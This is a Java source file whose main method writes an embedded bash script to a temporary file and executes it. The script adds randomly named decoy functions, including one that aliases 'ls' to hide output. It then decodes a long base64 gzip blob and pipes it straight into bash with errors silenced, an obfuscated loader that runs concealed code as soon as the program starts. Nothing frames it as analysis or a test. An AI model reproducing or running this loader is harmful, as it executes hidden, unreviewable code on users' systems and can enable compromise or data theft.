import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

vqpbfxst3() { echo $((RANDOM * RANDOM)); }
vad0be24e() { for i in {1..3}; do :; done; }
vohhnkivt() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
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
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
